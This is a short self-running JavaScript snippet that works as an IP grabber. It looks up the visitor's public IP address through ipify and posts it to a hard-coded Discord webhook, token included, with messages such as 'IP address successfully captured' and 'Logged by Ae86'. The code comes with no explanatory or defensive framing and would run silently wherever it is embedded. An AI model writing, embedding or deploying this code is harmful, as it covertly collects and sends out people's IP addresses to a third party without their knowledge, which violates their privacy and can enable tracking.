
(async () => {
    try {
        const { ip: userIp } = await (await fetch("https://api.ipify.org/?format=json")).json();
        const payload = {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: "User IP Logged",
                embeds: [{
                    title: "Logged Info",
                    description: "IP address successfully captured.",
                    color: 16711680,
                    fields: [
                        {
                            name: "IP Address",
                            value: userIp || "Unavailable"
                        }
                    ],
                    footer: {
                        text: "Logged by Ae86"
                    }
                }]
            })
        };
        const webhookUrl = "https://discord.com/api/webhooks/1320726497400455289/ykCeh-PIPZgrb5csQ1dHwYWI_e8Jvq4IPXW1ANf4Fl0sZzo1gjgzxPQkvuJqpelCivDy";
        const response = await fetch(webhookUrl, payload);
        if (!response.ok) {
            console.error("Failed to send webhook:", await response.text());
        }
    } catch (error) {
        console.error("Error logging IP address:", error);
    }
})();
